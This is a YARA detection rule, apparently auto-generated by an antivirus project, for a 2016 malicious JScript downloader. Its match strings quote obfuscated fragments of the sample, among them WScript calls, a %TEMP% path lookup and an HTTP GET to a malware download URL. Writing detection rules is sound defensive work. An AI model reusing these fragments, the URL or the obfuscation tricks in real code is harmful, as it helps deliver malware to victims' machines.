rule sig_20160428_d307d40c2ff85481155ba09eacd42829 {
  meta:
    description = "datamaliciousorder - file 20160428_d307d40c2ff85481155ba09eacd42829.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "023e688897b7b840c187261917f3b5ffd1ff33aabffdb47d155a7e7d16951ca7"

  strings:
    $s1  = "function KpqSavPglBcpPwwJmdNli(DomWqsIqkRsiXbzAsfIwc){EckPeeCtpGtcNirZrbGog[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function KpqSavPglBcpPwwJmdNli(DomWqsIqkRsiXbzAsfIwc){EckPeeCtpGtcNirZrbGog[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function CnuZzhHknPnuVevAflAeu() {return EckPeeCtpGtcNirZrbGog[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function GjfTgtHlmUnvYgwZnzYwv(ApmVskSwrChoNpoXjwNav, UdrTenIztYnaYsxOfoUfv){WhwMdnUucEayLtnJusMas = WhwMdnUucEayLtnJusMas * 1; " ascii
    $s5  = "return ApmVskSwrChoNpoXjwNav - UdrTenIztYnaYsxOfoUfv;};" fullword ascii
    $s6  = "var EckPeeCtpGtcNirZrbGog = function TxvDnlOudXvdLyrPloPdn() {return SikSoeJcpKbdLbgPjnRmi[DfzUljQlkFmtStoBlrQzg](\"WScript\"+\"" ascii
    $s7  = "VhmZfnLdsLubNvpKpsJtw[OjwLhmRgnQjyOtlPweAey](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s8  = "var SikSoeJcpKbdLbgPjnRmi = this[\"WScript\"];" fullword ascii
    $s9  = "var EckPeeCtpGtcNirZrbGog = function TxvDnlOudXvdLyrPloPdn() {return SikSoeJcpKbdLbgPjnRmi[DfzUljQlkFmtStoBlrQzg](\"WScript\"+\"" ascii
    $s10 = "function GrhVctJybEtqRmaSyhFam() {return ((TrhPybCvuMkhObiQxjGug == true) && (TrhPybCvuMkhObiQxjGug == SceTmpNgbJwlKuoDtgDsq)) ?" ascii
    $s11 = "function GrhVctJybEtqRmaSyhFam() {return ((TrhPybCvuMkhObiQxjGug == true) && (TrhPybCvuMkhObiQxjGug == SceTmpNgbJwlKuoDtgDsq)) ?" ascii
    $s12 = "function CnuZzhHknPnuVevAflAeu() {return EckPeeCtpGtcNirZrbGog[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s13 = "function GjfTgtHlmUnvYgwZnzYwv(ApmVskSwrChoNpoXjwNav, UdrTenIztYnaYsxOfoUfv){WhwMdnUucEayLtnJusMas = WhwMdnUucEayLtnJusMas * 1; " ascii
    $s14 = "function DfeNphQmkRnhWwmEtkEfj(){return UbxKsuRphOtrSynSyfSbj + \"\";};" fullword ascii
    $s15 = "if (VhmZfnLdsLubNvpKpsJtw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s16 = "SceTmpNgbJwlKuoDtgDsq = true; " fullword ascii
    $s17 = "var SceTmpNgbJwlKuoDtgDsq = false;" fullword ascii
    $s18 = "var TrhPybCvuMkhObiQxjGug = false;" fullword ascii
    $s19 = "function TrlXnlIccGquKdeKyiUsh(){return 23;};" fullword ascii
    $s20 = "function EyxWukOzzUkpRpgAwkYls()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}